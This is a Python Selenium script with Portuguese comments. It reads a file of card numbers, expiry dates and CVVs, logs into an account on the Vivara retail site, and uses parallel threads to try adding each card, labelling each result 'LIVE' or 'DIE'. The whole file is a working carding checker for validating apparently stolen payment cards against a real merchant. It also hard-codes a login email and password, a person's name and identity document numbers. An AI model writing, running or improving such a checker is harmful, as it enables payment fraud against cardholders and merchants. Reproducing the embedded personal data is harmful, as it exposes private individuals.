import os
import time
import concurrent.futures
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains

# Configurações de Threads
MAX_WORKERS = 5

def get_driver():
    """Cria e retorna uma instância do Chrome otimizada para velocidade."""
    options = webdriver.ChromeOptions()
    # options.add_argument("--headless") # Descomente para rodar sem interface gráfica
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-extensions")
    options.add_argument("--blink-settings=imagesEnabled=false") # Bloqueia imagens para rapidez
    options.add_argument("--log-level=3")
    options.add_argument("--window-size=1920,1080")
    
    # User-Agent comum
    options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
    
    driver = webdriver.Chrome(options=options)
    driver.set_page_load_timeout(30)
    return driver

def check_card_vivara(email, password, card_line):
    """Realiza o fluxo de login e adição de cartão na Vivara."""
    card_line = card_line.strip()
    if not card_line:
        return
    
    partes = card_line.split("|")
    if len(partes) != 4:
        print(f"[ERRO] Cartão mal formatado: {card_line}")
        return
    
    numero, mes, ano, cvv = partes
    # Vivara geralmente usa MM/AA ou MMAA, vamos preparar conforme o placeholder se necessário
    # Por padrão, vamos usar MM/AA para cc-exp se for o caso comum em sites brasileiros
    # Mas como o user não especificou o formato, vamos tentar o que parece mais provável.
    validade = f"{mes}/{ano[-2:]}" if len(ano) == 4 else f"{mes}/{ano}"
    
    driver = get_driver()
    wait = WebDriverWait(driver, 15)
    
    try:
        # 1. Login
        print(f"[STATUS] Acessando login Vivara para {email}...")
        driver.get("https://www.vivara.com.br/api/io/login?returnUrl=https://www.vivara.com.br/")
        
        # Lidar com banner de cookies se aparecer
        try:
            btn_cookies = WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Aceitar') or contains(text(), 'Concordar')]")))
            driver.execute_script("arguments[0].click();", btn_cookies)
            print("[INFO] Banner de cookies aceito.")
        except:
            pass

        # Preencher E-mail
        print("[STATUS] Preenchendo e-mail...")
        input_email = wait.until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Ex.: exemplo@mail.com']")))
        driver.execute_script("arguments[0].click();", input_email) # Focar
        input_email.clear()
        input_email.send_keys(email)
        
        # Preencher Senha
        print("[STATUS] Preenchendo senha...")
        input_senha = wait.until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Adicione sua senha']")))
        driver.execute_script("arguments[0].click();", input_senha) # Focar
        input_senha.clear()
        input_senha.send_keys(password)
        
        # Clicar Entrar
        print("[STATUS] Clicando em Entrar...")
        btn_entrar = wait.until(EC.element_to_be_clickable((By.XPATH, "//div[contains(@class, 'vtex-login-2-x-sendButton')]//button")))
        driver.execute_script("arguments[0].click();", btn_entrar)
        
        # 2. Navegar para Minha Conta / Cartões
        print(f"[STATUS] Navegando para a página de cartões...")
        time.sleep(6) # Tempo para processar o login
        driver.get("https://www.vivara.com.br/api/io/account#/cards/new")
        
        # Verificar se houve redirecionamento para login (login falhou)
        current_url = driver.current_url
        if "login" in current_url and "account" not in current_url:
            print(f"[ERRO] Login parece ter falhado. URL atual: {current_url}")
            return False

        # 3. Adicionar Cartão
        # VTEX às vezes usa iframes na área de conta. Vamos verificar e entrar se necessário.
        found = False
        print("[STATUS] Procurando botão 'Adicionar cartão'...")
        try:
            # Tenta encontrar o botão no conteúdo principal primeiro
            xpath_add = "//*[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'adicionar cartão')]"
            btn_add_cartao = WebDriverWait(driver, 15).until(EC.element_to_be_clickable((By.XPATH, xpath_add)))
        except:
            # Se não achou, tenta procurar dentro de iframes
            iframes = driver.find_elements(By.TAG_NAME, "iframe")
            for iframe in iframes:
                try:
                    driver.switch_to.frame(iframe)
                    btn_add_cartao_list = driver.find_elements(By.XPATH, "//*[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'adicionar cartão')]")
                    if btn_add_cartao_list:
                        btn_add_cartao = btn_add_cartao_list[0]
                        print("[INFO] Botão 'Adicionar' encontrado dentro de um iframe. Clicando...")
                        driver.execute_script("arguments[0].click();", btn_add_cartao)
                        found = True
                        break
                except:
                    pass
                driver.switch_to.default_content()
            
            if not found:
                # Última tentativa: clicar pelo texto exato se o translate falhou por algum motivo
                try:
                    btn_add_cartao = wait.until(EC.element_to_be_clickable((By.XPATH, "//*[contains(text(), 'ADICIONAR') or contains(text(), 'Adicionar')]")))
                except:
                    print("[ERRO] Não foi possível encontrar o botão 'Adicionar cartão' após várias tentativas.")
                    return False
        
        if not found and 'btn_add_cartao' in locals():
            print("[INFO] Clicando no botão 'Adicionar cartão' no conteúdo principal...")
            driver.execute_script("arguments[0].click();", btn_add_cartao)
        
        time.sleep(4) # Espera o formulário abrir/renderizar após o clique
        
        # 4. Preencher Formulário do Cartão
        print(f"[STATUS] Preenchendo dados do cartão {numero}...")
        time.sleep(3) # Espera o formulário carregar
        
        def fill_field(name, value, description):
            # Tenta no contexto atual
            try:
                element = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, name)))
                # Ação robusta para apagar o que tem escrito (Ctrl+A -> Backspace)
                driver.execute_script("arguments[0].click();", element)
                element.send_keys(webdriver.Keys.CONTROL + "a")
                element.send_keys(webdriver.Keys.BACKSPACE)
                time.sleep(0.5)
                element.send_keys(value)
                return True
            except:
                # Tenta em iframes
                driver.switch_to.default_content() # Volta pro topo pra garantir
                iframes = driver.find_elements(By.TAG_NAME, "iframe")
                for iframe in iframes:
                    try:
                        driver.switch_to.frame(iframe)
                        elements = driver.find_elements(By.NAME, name)
                        if elements:
                            # Ação robusta para apagar o que tem escrito
                            driver.execute_script("arguments[0].click();", elements[0])
                            elements[0].send_keys(webdriver.Keys.CONTROL + "a")
                            elements[0].send_keys(webdriver.Keys.BACKSPACE)
                            time.sleep(0.5)
                            elements[0].send_keys(value)
                            return True
                    except:
                        pass
                    driver.switch_to.default_content()
            print(f"[AVISO] Não foi possível preencher o campo: {description} ({name})")
            return False

        # Preencher os campos
        fill_field("cc-number", numero, "Número do cartão")
        fill_field("cardHolder", "cleomar born da silva", "Nome do titular")
        fill_field("cc-exp", validade, "Validade")
        fill_field("cc-csc", cvv, "Código de segurança")
        
        # Novos campos solicitados (usando os nomes exatos informados: documentType e document)
        fill_field("documentType", "848.303.360-72", "CPF")
        fill_field("document", "26.078.465-5", "RG/Documento")
        
        # 5. Salvar
        print("[STATUS] Clicando em Salvar novo cartão...")
        xpath_save = "//button[@type='submit'] | //button[contains(translate(., 'SALVAR NOVO CARTÃO', 'salvar novo cartão'), 'salvar novo cartão')]"
        save_clicked = False
        
        # Tenta no contexto atual primeiro
        try:
            btn_salvar = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, xpath_save)))
            time.sleep(1) # Pequena pausa para garantir que o site registrou os inputs
            driver.execute_script("arguments[0].click();", btn_salvar)
            # Tenta também um clique nativo para garantir
            try: btn_salvar.click(); 
            except: pass
            save_clicked = True
        except:
            pass

        if not save_clicked:
            # Volta pro topo e tenta novamente, inclusive em iframes
            driver.switch_to.default_content()
            try:
                btn_salvar = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, xpath_save)))
                time.sleep(1)
                driver.execute_script("arguments[0].click();", btn_salvar)
                try: btn_salvar.click(); 
                except: pass
                save_clicked = True
            except:
                # Procura em todos os iframes do topo
                iframes = driver.find_elements(By.TAG_NAME, "iframe")
                for iframe in iframes:
                    try:
                        driver.switch_to.frame(iframe)
                        btn_salvar_list = driver.find_elements(By.XPATH, xpath_save)
                        if btn_salvar_list:
                            time.sleep(1)
                            driver.execute_script("arguments[0].click();", btn_salvar_list[0])
                            try: btn_salvar_list[0].click(); 
                            except: pass
                            save_clicked = True
                            break
                    except:
                        pass
                    driver.switch_to.default_content()
        
        if not save_clicked:
            print("[ERRO] Não foi possível encontrar o botão de 'Salvar'.")
            driver.save_screenshot(f"erro_salvar_{numero}.png")
            return False

        # Verificação de resultado (LIVE ou DIE)
        print(f"[INFO] Clique em Salvar realizado para {numero}. Verificando resultado...")
        
        # Espera de até 15 segundos de forma inteligente
        is_die = False
        start_check = time.time()
        error_msg = "Falha ao autenticar o cartão. Verifique os dados do cartão e tente novamente."
        
        while time.time() - start_check < 15:
            # 1. Verifica se a mensagem de erro apareceu (DIE)
            # Procuramos em todo o texto da página e também dentro de iframes
            page_text = driver.page_source
            if error_msg in page_text:
                is_die = True
                break
            
            # Tenta em iframes (caso a mensagem apareça lá)
            driver.switch_to.default_content()
            iframes = driver.find_elements(By.TAG_NAME, "iframe")
            for iframe in iframes:
                try:
                    driver.switch_to.frame(iframe)
                    if error_msg in driver.page_source:
                        is_die = True
                        break
                except: pass
                driver.switch_to.default_content()
            
            if is_die: break
            
            # 2. Verifica se o formulário sumiu ou se redirecionou (LIVE)
            try:
                num_fields = driver.find_elements(By.NAME, "cc-number")
                if not num_fields or not num_fields[0].is_displayed():
                    time.sleep(2)
                    if error_msg not in driver.page_source:
                        print(f"[LIVE] {numero}")
                        driver.save_screenshot(f"live_{numero}.png")
                        time.sleep(5) # Pausa final para o usuário ver
                        return True
            except:
                pass
                
            time.sleep(2)

        if is_die:
            print(f"[DIE] {numero}")
            time.sleep(5) # Pausa final para o usuário ver
            return False
        else:
            print(f"[LIVE-?] {numero} (Não detectamos erro em 15s)")
            time.sleep(5) # Pausa final para o usuário ver
            return True

    except Exception as e:
        print(f"[ERRO] Falha no processo para {numero}: {str(e)}")
        return False
    finally:
        driver.quit()

def main():
    MEU_EMAIL = "p808409@gmail.com"
    MINHA_SENHA = "@P808409p10"
    ARQUIVO_CARDS = "card.txt"
    
    if not os.path.exists(ARQUIVO_CARDS):
        # Tenta criar um arquivo de teste se não existir (Opcional)
        print(f"Erro: Arquivo '{ARQUIVO_CARDS}' não encontrado!")
        return

    with open(ARQUIVO_CARDS, "r") as f:
        linhas = [l.strip() for l in f.readlines() if l.strip()]

    if not linhas:
        print("Arquivo de cartões vazio.")
        return

    print(f"--- Iniciando Automação Vivara ({len(linhas)} cartões, {MAX_WORKERS} threads) ---")
    start_total = time.time()

    # Usando ThreadPoolExecutor para rodar múltiplos em paralelo
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        executor.map(lambda l: check_card_vivara(MEU_EMAIL, MINHA_SENHA, l), linhas)

    end_total = time.time()
    print(f"\n--- Finalizado em {end_total - start_total:.2f} segundos ---")

if __name__ == "__main__":
    main()
